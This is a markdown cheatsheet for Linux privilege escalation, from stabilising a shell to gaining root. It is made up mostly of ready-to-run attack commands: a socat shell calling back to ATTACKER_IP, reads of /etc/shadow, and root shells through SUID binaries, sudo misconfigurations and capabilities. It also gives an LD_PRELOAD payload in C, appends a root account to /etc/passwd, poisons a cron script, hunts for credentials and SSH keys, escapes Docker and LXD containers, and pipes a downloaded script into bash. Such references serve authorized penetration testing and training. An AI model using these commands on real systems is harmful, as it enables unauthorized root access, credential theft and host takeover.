# Linux Privilege Escalation

> A structured cheatsheet for Linux privilege escalation — from initial shell to root. Covers manual checks, common misconfigurations, and key tools.

---

## Table of Contents

- [Initial Shell Stabilisation](#initial-shell-stabilisation)
- [System Enumeration](#system-enumeration)
- [SUID / SGID Binaries](#suid--sgid-binaries)
- [Sudo Misconfigurations](#sudo-misconfigurations)
- [Cron Jobs](#cron-jobs)
- [Writable Files & Paths](#writable-files--paths)
- [Capabilities](#capabilities)
- [Credentials in Files](#credentials-in-files)
- [Kernel Exploits](#kernel-exploits)
- [Docker / LXD / Container Escapes](#docker--lxd--container-escapes)
- [Automated Tools](#automated-tools)

---

## Initial Shell Stabilisation

```bash
# Python3 PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# After spawning PTY — fix terminal size
# (background with Ctrl+Z first, then on your local machine:)
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 200

# Socat full TTY (if socat available on target)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

---

## System Enumeration

```bash
# OS & kernel
uname -a
cat /etc/os-release
cat /proc/version

# Current user
id; whoami; groups

# Users & hashes
cat /etc/passwd
cat /etc/shadow  # (requires root or group shadow)

# Environment
env; printenv

# Running processes
ps auxf

# Network
ss -tulpn
netstat -antp 2>/dev/null
ip route
cat /etc/hosts

# Installed software
dpkg -l 2>/dev/null | head -50
rpm -qa 2>/dev/null | head -50
```

---

## SUID / SGID Binaries

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both at once
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null
```

> 💡 Check any non-standard SUID binary on [GTFOBins](https://gtfobins.github.io/) for exploitation techniques.

### Common SUID exploits

| Binary | Exploit |
|--------|---------|
| `/bin/bash -p` | Drops to root shell if bash is SUID |
| `find . -exec /bin/bash -p \;` | If `find` is SUID |
| `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` | If Python is SUID |
| `vim -c ':!/bin/bash'` | If `vim` is SUID |
| `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` | Copy & set SUID |

---

## Sudo Misconfigurations

```bash
# List allowed sudo commands
sudo -l

# Run as another user
sudo -u user2 /bin/bash

# Wildcard abuse — if sudo allows: /usr/bin/tee *
echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" | \
  sudo /usr/bin/tee -a /etc/passwd
```

### LD_PRELOAD trick

If `env_keep += LD_PRELOAD` is set in sudoers:

```c
// evil.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
sudo LD_PRELOAD=/tmp/evil.so <any-allowed-command>
```

---

## Cron Jobs

```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# User crontabs
crontab -l
cat /var/spool/cron/crontabs/*  # (may need root)

# pspy — watch processes without root
./pspy64 -pf -i 1000
```

### Writable cron script attack
```bash
# If a root cron job runs /opt/backup.sh and you can write to it:
echo 'chmod +s /bin/bash' >> /opt/backup.sh
# Wait for cron to run, then:
bash -p
```

---

## Writable Files & Paths

```bash
# World-writable files (excluding /proc, /sys)
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev"

# World-writable directories
find / -writable -type d 2>/dev/null | grep -v "/proc\|/sys\|/dev\|/tmp\|/run"

# Check PATH for writable directories
echo $PATH
# If /tmp or a writable dir is in PATH and a script calls a command without full path,
# create a malicious binary with that name in the writable directory.
```

---

## Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Common dangerous capabilities
# cap_setuid+ep on python: 
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_net_raw: packet capture (can sniff creds)
# cap_sys_ptrace: trace / inject into processes
```

---

## Credentials in Files

```bash
# Search for passwords in config files
grep -rn "password\|passwd\|secret\|api_key\|token" /var/www/ 2>/dev/null
grep -rn "password" /etc/ 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.zsh_history

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null

# Database credentials
find / -name "*.conf" -o -name "*.cfg" -o -name "wp-config.php" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

---

## Kernel Exploits

```bash
# Get kernel version
uname -r

# Check for dirty cow (CVE-2016-5195)
uname -r | grep -E "^(2\.6\.(22|23|24|25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42))"

# Use linux-exploit-suggester
./linux-exploit-suggester.sh

# searchsploit
searchsploit linux kernel $(uname -r | cut -d- -f1) local privilege escalation
```

> ⚠️ Kernel exploits are noisy and risky. Use as a last resort.

---

## Docker / LXD / Container Escapes

```bash
# Check if in container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Check group membership
id  # look for 'docker' or 'lxd' group

# Docker socket escape (if docker group or rw socket)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD escape
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# now at /mnt/root = host filesystem
```

---

## Automated Tools

| Tool | Command |
|------|---------|
| LinPEAS | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| bash` |
| LinEnum | `./LinEnum.sh -s -r report -e /tmp/ -t` |
| linux-smart-enumeration | `./lse.sh -l 2` |
| pspy | `./pspy64 -pf -i 1000` |
| linux-exploit-suggester | `./linux-exploit-suggester.sh` |

---

*Last updated: 2024-02-14 · Category: Linux*
